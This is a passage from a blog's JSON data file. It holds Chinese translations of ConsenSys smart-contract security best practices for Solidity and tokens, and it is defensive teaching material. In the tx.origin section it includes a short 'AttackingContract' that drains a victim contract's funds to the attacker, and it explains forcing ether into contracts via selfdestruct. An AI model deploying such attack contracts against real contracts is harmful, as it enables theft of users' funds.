id=\"Solidity-详细建议\"><a href=\"#Solidity-详细建议\" class=\"headerlink\" title=\"Solidity 详细建议\"></a>Solidity 详细建议</h3><p>下面的建议对于 Solidity 来说十分详细，不过对于使用其他语言来开发智能合约来说，应该也是有所帮助的。</p>\n<h3 id=\"强制对不变值使用-assert\"><a href=\"#强制对不变值使用-assert\" class=\"headerlink\" title=\"强制对不变值使用 assert()\"></a>强制对不变值使用 <code>assert()</code></h3><p>当一个断言失败的时候，它的保护机制就会被触发 - 比如当一个不变的属性改变的时候。比如，在一个代币发行合约中，代币与以太币的汇率可能是固定的。然后你可以通过 <code>assert()</code> 来验证所有的这种情况。断言保护机制应该经常与其他技术结合，如暂停合约和允许升级。（否则，你可能会陷入停滞，而一个断言总是在失败。）</p>\n<p>例子：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Token &#123;</span><br><span class=\"line\">\tmapping (address =&gt; uint) public balanceOf;</span><br><span class=\"line\">\tuint public totalSupply;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction deposit() public payable &#123;</span><br><span class=\"line\">\t\tbalanceOf[msg.sender] += msg.value;</span><br><span class=\"line\">\t\ttotalSupply += msg.value;</span><br><span class=\"line\">\t\tassert(this.balance &gt;= totalSupply);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>注意断言并非对资产严格相等，因为合约可以不通过 <code>deposit</code> 函数强制<a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#ether-forcibly-sent\" target=\"_blank\" rel=\"noopener\">发送以太币</a></p>\n<h3 id=\"正确地使用-assert-和-require\"><a href=\"#正确地使用-assert-和-require\" class=\"headerlink\" title=\"正确地使用 assert() 和 require()\"></a>正确地使用 <code>assert()</code> 和 <code>require()</code></h3><p>在 Solidity 0.4.10 中，引入了 <code>assert()</code> 和 <code>require()</code>。<code>require(condition)</code> 被用来对用户的任何输入进行验证，如果条件不成立则回滚。<code>assert(condition)</code> 在条件不成立时也会回滚，但是只用在不变值上：内部错误或者检查你的合约是否是非法的状态。遵循这种范式将允许形式分析工具来进行验证工作，而非法的操作码永远不会到达：这意味着代码中的任何不变值都不会被违反，并且代码正确地验证。</p>\n<h3 id=\"小心整数除法\"><a href=\"#小心整数除法\" class=\"headerlink\" title=\"小心整数除法\"></a>小心整数除法</h3><p>所有整数除法都被向下取整。如果你需要更高的精度，考虑使用乘数，或者存储分子和分母。</p>\n<p>（在未来，Solidity 会有定点类型，这会使得整数除法更容易。）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad</span><br><span class=\"line\">uint x = 5 / 2; // Result is 2, all integer divison rounds DOWN to the nearest integer</span><br></pre></td></tr></table></figure>\n<p>使用乘数来防止向下取整，当使用 x 的时候要考虑到这个乘数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// good</span><br><span class=\"line\">uint multiplier = 10;</span><br><span class=\"line\">uint x = (5 * multipler) / 2;</span><br></pre></td></tr></table></figure>\n<p>存储分子和分母意味着你可以离链计算分子除以分母的结果。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// good</span><br><span class=\"line\">uint numerator = 5;</span><br><span class=\"line\">uint denominator = 2;</span><br></pre></td></tr></table></figure>\n<h3 id=\"记住以太币可以被强制发送到一个账户\"><a href=\"#记住以太币可以被强制发送到一个账户\" class=\"headerlink\" title=\"记住以太币可以被强制发送到一个账户\"></a>记住以太币可以被强制发送到一个账户</h3><p>注意对严格检查了的合约的余额进行编码。</p>\n<p>一个攻击者可以强制对任何账户发送 wei，而且这不能被阻止（即使是使用了 <code>revert()</code> 的 fallback 函数也不可以）</p>\n<p>攻击者通过创余额为 1 wei 的合约，然后通过 <code>selfdestruct(victimAddress)</code> 的方式达到目的。<code>victimAddress</code> 中没有代码被激活，所以这不能被阻止。</p>\n<h3 id=\"注意抽象合约和接口的平衡\"><a href=\"#注意抽象合约和接口的平衡\" class=\"headerlink\" title=\"注意抽象合约和接口的平衡\"></a>注意抽象合约和接口的平衡</h3><p>接口和抽象合约都为智能合约提供了一种定制的，可复用的方式。接口，在 Solidity 0.4.11 中被引入，与抽象合约十分相似，但是接口不能有已经实现的方法。接口同样也有限制，它不能访问存储，不能继承其他接口，而这通常使得抽象合约更加实用。虽然，接口实际上对设计合约的实现上十分有用。另外，十分重要的是如果一个合约继承了一个抽象合约，那它必须通过重写来实现所有抽象合约中未实现的函数，否则它依旧是一个抽象合约。</p>\n<h3 id=\"保持-fallback-函数简单\"><a href=\"#保持-fallback-函数简单\" class=\"headerlink\" title=\"保持 fallback 函数简单\"></a>保持 fallback 函数简单</h3><p>当一个合约发送了没有参数（或者当没有函数匹配上的时候）的消息时，<a href=\"https://solidity.readthedocs.io/en/latest/contracts.html#fallback-function\" target=\"_blank\" rel=\"noopener\">Fallback 函数</a> 会被调用，而且如果通过 <code>.send()</code> 或者 <code>.transfer()</code> 调用的话只需要 2300 单位的燃料。如果你希望能够从 <code>.send()</code> 或者 <code>.transfer()</code> 接受以太币，你能做的就是在 fallback 函数中记录一个日志。如果需要计算，或者更多的燃料，就使用一个真正的函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad</span><br><span class=\"line\">funciton() payable &#123; balances[msg.sender] += msg.value; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">function deposit() payable external &#123; balances[msg.sender] += msg.value; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function() payable &#123; LogDepositReceived(msg.sender); &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"为函数和状态变量显式标记可见性\"><a href=\"#为函数和状态变量显式标记可见性\" class=\"headerlink\" title=\"为函数和状态变量显式标记可见性\"></a>为函数和状态变量显式标记可见性</h3><p>显式标记函数和状态变量的可见性。函数可以被指定为 <code>external / public / internal / private</code>。请理解它们之间的区别，比如，比起 <code>public</code>，<code>external</code> 可能已经足够使用了。对于状态变量来说，<code>external</code> 是不可能的。显式标记可见性将更容易捕捉有关谁可以调用函数或访问变量的错误假设。 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad</span><br><span class=\"line\">uint x; // the default is internal for state variables, but it should be made explicit</span><br><span class=\"line\">function buy() &#123; // the default is public </span><br><span class=\"line\">\t\t// public code</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">uint private y;</span><br><span class=\"line\">function buy() external &#123;</span><br><span class=\"line\">\t\t// only callable external</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function utility() public &#123;</span><br><span class=\"line\">\t\t// callable externally, as well as internally: changing this code requires thinking about both cases</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function internalAction() internal &#123;</span><br><span class=\"line\">\t\t// internal code</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"锁定指定编译器版本的编译指示\"><a href=\"#锁定指定编译器版本的编译指示\" class=\"headerlink\" title=\"锁定指定编译器版本的编译指示\"></a>锁定指定编译器版本的编译指示</h3><p>应该使用相同的编译器版本部署合同，并标记它们已经经过了足够的测试。锁定编译指示可以帮助确保合约不会意外部署，比如，最新的编译器对未知错误有更高的风险。合约也可能由其他人部署，通过编译指示就知道原作者打算使用的编译器版本。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad </span><br><span class=\"line\">pragma solidity ^0.4.4;</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">pragma solidity 0.4.0;</span><br></pre></td></tr></table></figure>\n<h4 id=\"异常\"><a href=\"#异常\" class=\"headerlink\" title=\"异常\"></a>异常</h4><p>当合约打算供其他开发人员使用时，可以允许 <code>pragma</code> 语句浮动，例如类库或者 EthPM 包。否则，开发人员为了在本地编译就需要手动更新编译指示。</p>\n<h3 id=\"函数和事件的区别\"><a href=\"#函数和事件的区别\" class=\"headerlink\" title=\"函数和事件的区别\"></a>函数和事件的区别</h3><p>对事件名首字母大写,以及添加作用前缀，来防止对函数和事件产生困惑。对于方法来说，总是以小写字母开头，除了构造函数之外。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad </span><br><span class=\"line\">event Transfer() &#123;&#125;</span><br><span class=\"line\">function transfer() &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">event LogTransfer() &#123;&#125;</span><br><span class=\"line\">function transfer() external &#123;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"推荐使用更新的-Solidity-结构\"><a href=\"#推荐使用更新的-Solidity-结构\" class=\"headerlink\" title=\"推荐使用更新的 Solidity 结构\"></a>推荐使用更新的 Solidity 结构</h3><p>使用构造/别名如 <code>selfdestruct</code> （而不是 <code>suicide</code>），和 <code>keccak256</code> （而不是 <code>sha3</code>）。<code>require(msg.sender.send(1 ether))</code> 也可以使用 <code>transfer()</code> 简单地实现： <code>msg.sender.transfer(1 ether)</code>。</p>\n<h3 id=\"注意内置函数可以被覆盖\"><a href=\"#注意内置函数可以被覆盖\" class=\"headerlink\" title=\"注意内置函数可以被覆盖\"></a>注意内置函数可以被覆盖</h3><p>目前可以在 Solidity 覆盖（<a href=\"https://en.wikipedia.org/wiki/Variable_shadowing\" target=\"_blank\" rel=\"noopener\">shadow</a>）内置的全局变量。它允许合约重写覆盖内置的方法，如 <code>msg</code> 和 <code>revert()</code>。尽管这是<a href=\"https://github.com/ethereum/solidity/issues/1249\" target=\"_blank\" rel=\"noopener\">故意</a>的，但是它可能会在关于合约的真实行为上误导合约的用户。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract PretendingToRevert &#123;</span><br><span class=\"line\">\tfunction revert() internal constant &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ExampleContract is PretendingToRevert &#123;</span><br><span class=\"line\">\tfunction somethingBad() public &#123;</span><br><span class=\"line\">\t\trevert();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>合约用户（和审计人员）应该注意他们想要使用的应用的所有合约源代码。</p>\n<h3 id=\"避免使用-tx-origin\"><a href=\"#避免使用-tx-origin\" class=\"headerlink\" title=\"避免使用 tx.origin\"></a>避免使用 <code>tx.origin</code></h3><p>永远不要使用 <code>tx.origin</code> 进行授权，另一个合约可以有一种方法来调用你的合约（比如用户有一些资金），而因为你的地址在 <code>tx.origin</code> 里面，你的合约就会授权该交易。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.18;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MyContract &#123;</span><br><span class=\"line\">\taddress owner;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction MyContract() public &#123;</span><br><span class=\"line\">\t\towner = msg.sender;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction sendTo(address receiver, uint amount) public &#123;</span><br><span class=\"line\">\t\trequire(tx.origin == owner);</span><br><span class=\"line\">\t\treceiver.transfer(amount);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract AttackingContract &#123;</span><br><span class=\"line\">\tMyContract myContract;</span><br><span class=\"line\">\taddress attacker;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction AttackingContract(address myContractAddress) public &#123;</span><br><span class=\"line\">\t\tmyContract = MyContract(myContractAddress);</span><br><span class=\"line\">\t\tattacker = msg.sender;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction() public &#123;</span><br><span class=\"line\">\t\tmyContract.sendTo(attacker, msg.sender.balance);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>你应该使用 <code>msg.sender</code> 来授权（如果有另一个合约调用了你的合约，<code>msg.sender</code> 会成为合约的地址，而且不是调用合约的人的地址）。</p>\n<p>更多可见 <a href=\"https://solidity.readthedocs.io/en/develop/security-considerations.html#tx-origin\" target=\"_blank\" rel=\"noopener\">Solidity 文档</a></p>\n<p>除了授权的这个问题，<code>tx.origin</code> 可能在将来从以太坊协议中移除，所以使用了 <code>tx.origin</code> 的代码在将来不会再被兼容 <a href=\"https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof/200#200\" target=\"_blank\" rel=\"noopener\">Vitalik: ‘Do NOT assume that tx.origin will continue to be usable or meaningful.’</a></p>\n<p>另外值得一提的是，通过使用 <code>tx.origin</code>，你会限制合同之间的互操作性，因为使用 <code>tx.origin</code> 的合同不能被另一个合同使用，因为合同不能是 <code>tx.origin</code>。</p>\n<h3 id=\"时间戳依赖\"><a href=\"#时间戳依赖\" class=\"headerlink\" title=\"时间戳依赖\"></a>时间戳依赖</h3><p>在合同中使用时间戳执行关键功能时有三个主要考虑因素，特别是当涉及到资金转移时。</p>\n<h4 id=\"Gameability\"><a href=\"#Gameability\" class=\"headerlink\" title=\"Gameability\"></a>Gameability</h4><p>注意区块的时间戳是可用被矿工操作的。考虑这个<a href=\"https://etherscan.io/address/0xcac337492149bdb66b088bf5914bedfbf78ccc18#code\" target=\"_blank\" rel=\"noopener\">合约</a>：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uint256 constant private salt = block.timestamp;</span><br><span class=\"line\"></span><br><span class=\"line\">function random(uint Max) constant private returns (uint256 result) &#123;</span><br><span class=\"line\">\t//get the best seed for randomness</span><br><span class=\"line\">\tuint256 x = salt * 100/Max;</span><br><span class=\"line\">\tuint256 y = salt * block.number/(salt % 5);</span><br><span class=\"line\">\tuint256 seed = block.number/3 + (salt % 300) + Last_Payout + y;</span><br><span class=\"line\">\tuint256 h = uint256(block.blockhash(seed));</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn uint256((h / x)) % Max + 1; // random number between 1 and Max</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当合约使用时间戳来产生随机数时，矿工实际上可以在被验证块的 30 秒内发布时间戳，从而有效地允许矿工预先计算一个更有利于他们抽奖机会的选项。 时间戳不是随机的，不应该在这种情况下使用。</p>\n<h4 id=\"30-秒规则\"><a href=\"#30-秒规则\" class=\"headerlink\" title=\"30 秒规则\"></a>30 秒规则</h4><p>评估时间戳使用的一般经验法则是：</p>\n<p><strong>如果合约功能可以容忍30秒的时间漂移，则可以安全使用 <code>block.timestamp</code></strong></p>\n<p>如果您的时间相关事件的比例可以变化 30 秒并保持完整性，则使用时间戳是安全的。 这包括拍卖结束，注册期限等事情。</p>\n<h4 id=\"将-block-number-作为时间戳使用时要当心\"><a href=\"#将-block-number-作为时间戳使用时要当心\" class=\"headerlink\" title=\"将 block.number 作为时间戳使用时要当心\"></a>将 <code>block.number</code> 作为时间戳使用时要当心</h4><p>当合约创建一个 <code>auction_complete</code> 修饰器来表示代币销售的结束，像<a href=\"https://consensys.github.io/smart-contract-best-practices/(https://github.com/SpankChain/old-sc_auction/blob/master/contracts/Auction.sol\" target=\"_blank\" rel=\"noopener\">这样</a>)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier auction_complete &#123;</span><br><span class=\"line\">\trequire(auctionEndBlock &lt;= block.number ||</span><br><span class=\"line\">\t\tcurrentAuctionState == AuctionState.success ||</span><br><span class=\"line\">\t\tcurrentAuctionState == AuctionState.cancel)</span><br><span class=\"line\">\t\t_;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>block.number</code> 和 <a href=\"https://etherscan.io/chart/blocktime\" target=\"_blank\" rel=\"noopener\">平均出块时间</a> 也可以用来估算时间，但是这不是未来的证明，因为区块时间可以修改（例如 <a href=\"https://blog.ethereum.org/2015/08/08/chain-reorganisation-depth-expectations/\" target=\"_blank\" rel=\"noopener\">分叉重组</a> 和 <a href=\"https://github.com/ethereum/EIPs/issues/649\" target=\"_blank\" rel=\"noopener\">难度炸弹</a>）。在一天的销售中，12分钟规则允许人们构建更可靠的时间估计。</p>\n<h3 id=\"弃用-历史-建议\"><a href=\"#弃用-历史-建议\" class=\"headerlink\" title=\"弃用/历史 建议\"></a>弃用/历史 建议</h3><p>由于协议的修改或者 solidity 的提升，这些建议不再相关。They are recorded here for posterity and awareness.</p>\n<h4 id=\"注意被-0-除-（Solidity-lt-0-4）\"><a href=\"#注意被-0-除-（Solidity-lt-0-4）\" class=\"headerlink\" title=\"注意被 0 除 （Solidity &lt; 0.4）\"></a>注意被 0 除 （Solidity &lt; 0.4）</h4><p>在版本 0.4 之前，当一个数字除以 0 时，Solidity 会返回零，并且不会引发异常。 确保你至少运行 0.4 版本。</p>\n"},{"title":"智能合约最佳实践翻译五","comments":0,"date":"2018-03-24T05:40:06.000Z","img":null,"_content":"\n## [Token 实现最佳实践](https://consensys.github.io/smart-contract-best-practices/tokens/)\n\n实现 Token 应该符合其他的最佳实践，但是它有一些独特的考虑。\n\n### 遵守最新的标准\n\n通常来说，token 的智能合约应该遵循公认的稳定标准。\n\n当前公认的标准有：\n\n* [EIP20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md)\n* [EIP721](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-721.md)（不可替代的 token）\n\n### 注意 EIP-20 的前期攻击\n\nEIP-20 的 token 的 `approve()` 函数可能会让第三方提币量超过设置的预定数量。一个 [前期攻击](https://consensys.github.io/smart-contract-best-practices/known_attacks/#transaction-ordering-dependence-tod-front-running) 可以使得一个经过授权的用户不论是在调用方法 `approve()` 之前还是之后都可以调用 `transferFrom()` 函数。更多细节可见 [EIP](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md#approve) 和 [此文档](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit)。\n\n### 防止将 token 转到地址 0x0\n\n在写本文的此刻，“零”地址（[0x0000000000000000000000000000000000000000](https://etherscan.io/address/0x0000000000000000000000000000000000000000)）所拥有的 token 的价值超过了 8000,000 美元。\n\n### 防止将 token 转到合约地址\n\n注意不要将 token 转到和智能合约地址相同的地址。\n\n该情况下损失的一个例子就是 EOS token 的智能合约地址中有超过 90000 个 token。\n\n**例子：**\n\n实现上面的这些推荐的一个例子会创建下面这个修饰器，验证 `to` 地址不会是 0x0 也不会是该 token 自己的合约地址：\n```\nmodifier validDestination(address to) {\n\trequire(to != address(0x0));\n\trequire(to != address(this));\n\t_;\n}\n```\n\n该修饰器被添加到 `transfer` 和 `transferFrom` 方法：\n```\nfunction transfer(address _to, uint _value) validDestination(_to) returns (bool) {\n\t//some code\n}\n\nfunction transferFrom(address _from, address _to, uint _value) validDestination(_to) returns (bool) {\n\t//some code\n}\n```\n","source":"_posts/智能合约最佳实践翻译五.md","raw":"---\ntitle: 智能合约最佳实践翻译五\ncomments: false\ndate: 2018-03-24 13:40:06\ncategories: 区块链\ntags:\n- ZhouFyk\n- 以太坊\n- 智能合约\nimg:\n---\n\n## [Token 实现最佳实践](https://consensys.github.io/smart-contract-best-practices/tokens/)\n\n实现 Token 应该符合其他的最佳实践，但是它有一些独特的考虑。\n\n### 遵守最新的标准\n\n通常来说，token 的智能合约应该遵循公认的稳定标准。\n\n当前公认的标准有：\n\n* [EIP20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md)\n* [EIP721](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-721.md)（不可替代的 token）\n\n### 注意 EIP-20 的前期攻击\n\nEIP-20 的 token 的 `approve()` 函数可能会让第三方提币量超过设置的预定数量。一个 [前期攻击](https://consensys.github.io/smart-contract-best-practices/known_attacks/#transaction-ordering-dependence-tod-front-running) 可以使得一个经过授权的用户不论是在调用方法 `approve()` 之前还是之后都可以调用 `transferFrom()` 函数。更多细节可见 [EIP](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md#approve) 和 [此文档](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit)。\n\n### 防止将 token 转到地址 0x0\n\n在写本文的此刻，“零”地址（[0x0000000000000000000000000000000000000000](https://etherscan.io/address/0x0000000000000000000000000000000000000000)）所拥有的 token 的价值超过了 8000,000 美元。\n\n### 防止将 token 转到合约地址\n\n注意不要将 token 转到和智能合约地址相同的地址。\n\n该情况下损失的一个例子就是 EOS token 的智能合约地址中有超过 90000 个 token。\n\n**例子：**\n\n实现上面的这些推荐的一个例子会创建下面这个修饰器，验证 `to` 地址不会是 0x0 也不会是该 token 自己的合约地址：\n```\nmodifier validDestination(address to) {\n\trequire(to != address(0x0));\n\trequire(to != address(this));\n\t_;\n}\n```\n\n该修饰器被添加到 `transfer` 和 `transferFrom` 方法：\n```\nfunction transfer(address _to, uint _value) validDestination(_to) returns (bool) {\n\t//some code\n}\n\nfunction transferFrom(address _from, address _to, uint _value) validDestination(_to) returns (bool) {\n\t//some code\n}\n```\n","slug":"智能合约最佳实践翻译五","published":1,"updated":"2018-03-26T04:00:17.800Z","layout":"post","photos":[],"link":"","_id":"cjf7piavv001dpkwof5qoe26u","content":"<h2 id=\"Token-实现最佳实践\"><a href=\"#Token-实现最佳实践\" class=\"headerlink\" title=\"Token 实现最佳实践\"></a><a href=\"https://consensys.github.io/smart-contract-best-practices/tokens/\" target=\"_blank\" rel=\"noopener\">Token 实现最佳实践</a></h2><p>实现 Token 应该符合其他的最佳实践，但是它有一些独特的考虑。</p>\n<h3 id=\"遵守最新的标准\"><a href=\"#遵守最新的标准\" class=\"headerlink\" title=\"遵守最新的标准\"></a>遵守最新的标准</h3><p>通常来说，token 的智能合约应该遵循公认的稳定标准。</p>\n<p>当前公认的标准有：</p>\n<ul>\n<li><a href=\"https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md\" target=\"_blank\" rel=\"noopener\">EIP20</a></li>\n<li><a href=\"https://github.com/ethereum/EIPs/blob/master/EIPS/eip-721.md\" target=\"_blank\" rel=\"noopener\">EIP721</a>（不可替代的 token）</li>\n</ul>\n<h3 id=\"注意-EIP-20-的前期攻击\"><a href=\"#注意-EIP-20-的前期攻击\" class=\"headerlink\" title=\"注意 EIP-20 的前期攻击\"></a>注意 EIP-20 的前期攻击</h3><p>EIP-20 的 token 的 <code>approve()</code> 函数可能会让第三方提币量超过设置的预定数量。一个 <a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/#transaction-ordering-dependence-tod-front-running\" target=\"_blank\" rel=\"noopener\">前期攻击</a> 可以使得一个经过授权的用户不论是在调用方法 <code>approve()</code> 之前还是之后都可以调用 <code>transferFrom()</code> 函数。更多细节可见 <a href=\"https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md#approve\" target=\"_blank\" rel=\"noopener\">EIP</a> 和 <a href=\"https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit\" target=\"_blank\" rel=\"noopener\">此文档</a>。</p>\n<h3 id=\"防止将-token-转到地址-0x0\"><a href=\"#防止将-token-转到地址-0x0\" class=\"headerlink\" title=\"防止将 token 转到地址 0x0\"></a>防止将 token 转到地址 0x0</h3><p>在写本文的此刻，“零”地址（<a href=\"https://etherscan.io/address/0x0000000000000000000000000000000000000000\" target=\"_blank\" rel=\"noopener\">0x0000000000000000000000000000000000000000</a>）所拥有的 token 的价值超过了 8000,000 美元。</p>\n<h3 id=\"防止将-token-转到合约地址\"><a href=\"#防止将-token-转到合约地址\" class=\"headerlink\" title=\"防止将 token 转到合约地址\"></a>防止将 token 转到合约地址</h3><p>注意不要将 token 转到和智能合约地址相同的地址。</p>\n<p>该情况下损失的一个例子就是 EOS token 的智能合约地址中有超过 90000 个 token。</p>\n<p><strong>例子：</strong></p>\n<p>实现上面的这些推荐的一个例子会创建下面这个修饰器，验证 <code>to</code> 地址不会是 0x0 也不会是该 token 自己的合约地址：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier validDestination(address to) &#123;</span><br><span class=\"line\">\trequire(to != address(0x0));</span><br><span class=\"line\">\trequire(to != address(this));</span><br><span class=\"line\">\t_;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>该修饰器被添加到 <code>transfer</code> 和 <code>transferFrom</code> 方法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function transfer(address _to, uint _value) validDestination(_to) returns (bool) &#123;</span><br><span class=\"line\">\t//some code</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function transferFrom(address _from, address _to, uint _value) validDestination(_to) returns (bool) &#123;</span><br><span class=\"line\">\t//some code</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Token-实现最佳实践\"><a href=\"#Token-实现最佳实践\" class=\"headerlink\" title=\"Token 实现最佳实践\"></a><a href=\"https://consensys.github.io/smart-contract-best-practices/tokens/\" target=\"_blank\" rel=\"noopener\">Token 实现最佳实践</a></h2><p>实现 Token 应该符合其他的最佳实践，但是它有一些独特的考虑。</p>\n<h3 id=\"遵守最新的标准\"><a href=\"#遵守最新的标准\" class=\"headerlink\" title=\"遵守最新的标准\"></a>遵守最新的标准</h3><p>通常来说，token 的智能合约应该遵循公认的稳定标准。</p>\n<p>当前公认的标准有：</p>\n<ul>\n<li><a 